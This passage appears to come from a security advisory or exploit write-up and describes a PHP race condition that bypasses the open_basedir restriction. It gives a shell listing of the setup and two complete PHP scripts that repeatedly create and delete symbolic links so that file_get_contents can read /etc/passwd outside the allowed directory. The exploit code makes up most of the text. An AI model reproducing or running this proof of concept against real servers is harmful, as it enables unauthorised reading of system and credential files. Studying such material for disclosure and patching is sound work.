--Real Proof of Concept exploit--

We finally bypass the open_basedir restriction and we read the main dir content. Also we can read a file, like /etc/passwd.

In the third line of script1.php we make the symbolic link to ./etc/passwd so we have to create a folder named "etc" with a 
file named "passwd" inside:

[root@...3035 race_condition]# ls
a  etc  script1.php  script2.php  script.php
[root@...3035 race_condition]# cd etc
[root@...3035 etc]# ls
passwd
[root@...3035 etc]# cd ..
[root@...3035 race_condition]#

Then the script1.php is equal than the first one. We have just to change the symbolic link to "dummy/../../../../../../etc/passwd".
In the script2.php we try to read the file ("xxx" link) with the file_get_contents() function.

script1.php
<?
   symlink("a/a/a/a/a/a/", "dummy");
   symlink("dummy/../../../../../../etc/passwd", "xxx");
   unlink("dummy");
   while (1) {
        symlink(".", "dummy");
        unlink("dummy");
   }
?>

script2.php
<?
while (1) {
        print @file_get_contents("xxx");
}
?>

